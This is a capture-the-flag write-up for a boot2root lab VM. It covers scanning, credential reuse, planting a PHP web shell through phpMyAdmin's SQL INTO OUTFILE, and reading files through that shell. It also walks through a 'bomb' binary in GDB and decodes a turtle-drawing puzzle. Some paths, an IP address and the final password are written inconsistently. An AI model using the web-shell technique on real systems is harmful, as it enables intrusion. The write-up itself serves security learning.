start vm

Nmap find ip of VBOX host.

nmap find port of VBOX host.

port 80, 443, 21, 22, 143, 993

	 ----dirbuster on : https://192.168.0.42/ ----

	==> DIRECTORY: https://192.168.0.42/forum/js/
	==> DIRECTORY: https://192.168.0.42/forum/lang/
	==> DIRECTORY: https://192.168.0.42/forum/modules/
	==> DIRECTORY: https://192.168.0.42/forum/templates_c/
	==> DIRECTORY: https://192.168.0.42/forum/themes/
	==> DIRECTORY: https://192.168.0.42/forum/update/
	==> DIRECTORY: https://192.168.0.42/webmail/
	==> DIRECTORY: https://192.168.0.42/phpmyadmin/



into the forum we have lmezard post where we can see his password !q\]Ej?*5K5cy*AJ

we connect to the forum with log 
		
	lmezard:!q\]Ej?*5K5cy*AJ

the we check his webmail, and we connect with lmezard email

 	laurie@borntosec.net:!q\]Ej?*5K5cy*AJ

we see a mail DB Access
in the mail we find phpmyadmin root login : 
	
	root/Fg-'kKXBj87E:aJ$

so we have acces to the database and can run query , lets try to create a file

	SELECT "blabla123" INTO OUTFILE "/var/www/forum/js/testfile123" --- NOPE
	SELECT "blabla123" INTO OUTFILE "/var/www/forum/lang/testfile123" --- NOPE
	SELECT "blabla123" INTO OUTFILE "/var/www/forum/modules/testfile123" --- NOPE
	SELECT "blabla123" INTO OUTFILE "/var/www/forum/theme/testfile123" --- NOPE
	SELECT "blabla123" INTO OUTFILE "/var/www/forum/template_c/testfile123" --- YES!!!

so now i upload a exec php with system()

	SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/exc.php"

now i visit 
	
	https://192.168.0.42/form/exc?cmd=ls -R /home

and we have  /home/LOOKATME: password 

now i visit 

	https://192.168.0.42/form/exc?cmd=cat /home/LOOKATME/password
	lmezard:G!@M6f4Eatau{sF"

this doesnt work with SSH but it does with FTP

so 
	
	$ftp 192.1688.0.42
	lmezard
	G!@M6f4Eatau{sF"

and we are connected


	ftp>ls
	-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
	-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun

	ftp>get README

	$cat README
	Complete this little challenge and use the result as password for user 'laurie' to login in ssh

	ftp>get fun

	$cat fun
	//file634ft_fun/H87VI.pcap0000640000175000001440000000005412563172202012513 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
	//file618ft_fun/A5812.pcap0000640000175000001440000000003412563172202012404 0ustar  nnmusers}void useless() {
	//file155ft_fun/9U5NH.pcap0000640000175000001440000000005412563172202012516 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
	//file344ft_fun/CDU6L.pcap0000640000175000001440000000003412563172202012521 0ustar  nnmusers}void useless() {
	//file665ft_fun/O2AY2.pcap0000640000175000001440000000005312563172202012501 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
	//file10ft_fun/YVO5O.pcap0000640000175000001440000000005412563172202012567 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
	//file546ft_fun/VICU6.pcap0000640000175000001440000000003412563172202012540 0ustar  nnmusers}void useless() {
	//file617ft_fun/T44J5.pcap0000640000175000001440000000002712563172202012460 0ustar  nnmusers	return 'p';
	...

we have an archive ! (0ustar)

	$tar -xvf fun
	$cd ft_fun

we have thons of .pcap files

when we cat all files , we see that most of them contains the function "useless"
but some have the function getme()

	$grep getme *

we can see getme1, getme2, getme3....
when we cat the files they are not the full function but instead the file number with the rest of the function
"//fileXXX"

so with this we can rebuild the program and get the password : Iheartpwnage

we also seen this line : 	printf("Now SHA-256 it and submit");

	ssh -> laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

when we do ls there is a binary called Bomb


	phase_1 : Public speaking is very easy.
	these asm Insctruction, we have passwordssphrase in 0x80497c0
	   0x08048b2c <+12>:	push   $0x80497c0
	   0x08048b31 <+17>:	push   %eax
	   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>

	(gdb) x/s 0x80497c0
	0x80497c0:	 "Public speaking is very easy."

Answer : Public speaking is very easy.



phase_2 :    
we see func red_six_number so we have to input 6 number

	   0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
	   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>

by looking at the comparison one by one we can the the numbers are : 1 2 6 24 120 720
	
	=> 0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)
	(gdb) p ($esi,$ebx,4)

answer : 1 2 6 24 120 720

phase_3 : 

	we have our input stocked in  :	-0x4(%ebp)
					-0x5(%ebp)
					-0xc(%ebp)
sscanf format string %d %c %d

input : 1 k 3

	(gdb) x/c $ebp-0x5
	0xbffff713:     107 'k'

	(gdb) x/d $ebp-0x4
	0xbffff714:     3

	(gdb) xd $ebp-0xc
	0xbffff70c:     1

this comp : 

	=>	0x08048bc9 <+49>:    cmpl   $0x7,-0xc(%ebp)
		0x08048bcd <+53>:    ja     0x8048c88 <phase_3+240>

mean first number has to be < 7

this jump will jump according to first argument -0xc(%ebp)

	0x08048bd3 <+59>:    mov    -0xc(%ebp),%eax
	0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)

with jump 1 we have to match last number = 0xd6 (214)

	=> 0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)
	   0x08048c09 <+113>:   je     0x8048c8f <phase_3+247>

with jump 2 we have to match last number = 0x2f3 (755)
and $bl will be = 98 (character 'b')

	0x08048c16 <+126>:   mov    $0x62,%bl
	0x08048c18 <+128>:   cmpl   $0x2f3,-0x4(%ebp)

with jump 2 the answer is : 2 b 755
with the jump 1 the answer is : 1 b 214



phase_4 : we know we have 1 argument    
	
	0x08048cfe <+30>:    cmp    $0x1,%eax

we have to input a number
by looking at the code we see func4 is recursive function it will iterate depending on our input
i tryed high number like 999 255 and it loop infinitly
so i did with 1, 2, 3, 4, 5, 6, 7, 8, 9

and it worked at 9

solution : 9



phase_5 : by looking at the code we need to match the string "giants"
but when we type giants it is transformed to "hbsfev"

	(gdb) x/s 0x804980b
	0x804980b:       "giants"

	x/s $esi
	0x804b220 <array.123>:   "isrveawhobpnutfg\260\001"

when we input "isrvea" we get -> "bvrwas"
			  "whobpn" we get -> "hogrif"
			  "utfgis" we get -> "aewhbv"
			  "cdgjkl" we get -> "vehpnu"
			  "mqtxyz" we get -> "tseobp"

so e->a
   a->s
   o->g
   p->i
   k->n
   m->t

the answer is  "opekma"


phase_6 :
we have:
	
	0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>

on round 6 we need 6 int argument

the code check if the numbers are between 1 and 6
then it check that the numbers typed don't repeat then it will check the order

so we test all possibility until it work

we cant test numbers one by one with this comp 

	=> 0x08048e75 <+221>:	cmp    (%edx),%eax
	   0x08048e77 <+223>:	jge    0x8048e7e <phase_6+230>

with input : 1 2 3 4 5 6 the bomb explode at the first Comp
			 2 4 3 5 6 1 same
			 3 2 1 4 5 6 same
			 4 3 2 1 5 6 here we pass the first test ! we know the first number is 4


			 doing that for every numbers we have the solution : 4 2 6 3 1 5

afte some research i managed to get the final thor assword :

	Publicspeakingisveryeasy.126241207201b2149opekmq426135



after connecting to thor

we see a file called turtle with directions indication, the is for the well known Turtle lign drawer

so we use this python script : 

	from turtle import *
	color('red', 'yellow')
	begin_fill()
	i = 0
	speed(10)
	while True:
	    left(90)
	    forward(51)
	    while (i < 180):
		left(1)
		forward(1)
		i = i + 1
	    i = 0
	    while (i < 180):
		right(1)
		forward(1)
		i = i + 1
	    forward(260)
	    backward(210)
	    right(90)
	    forward(120)
	    right(10)
	    forward(200)
	    right(150)
	    forward(200)
	    backward(100)
	    right(120)
	    forward(50)
	    left(90)
	    forward(51)
	    i = 0
	    while (i < 180):
		left(1)
		forward(1)
		i = i + 1
	    i = 0
	    while (i < 180):
		right(1)
		forward(1)
		i = i + 1
	    forward(150)
	    backward(200)
	    forward(100)
	    right(90)
	    forward(100)
	    right(90)
	    forward(100)
	    backward(200)
	end_fill()
	done()


and the turltle draw the word SLASH of course its not the password
the challenge say we have to "digest the password"
so we will hash the password with 'Message digest5' (MD5)

MD5 slash -> 646da671ca01bb5d84dbb5fb2238dc8e
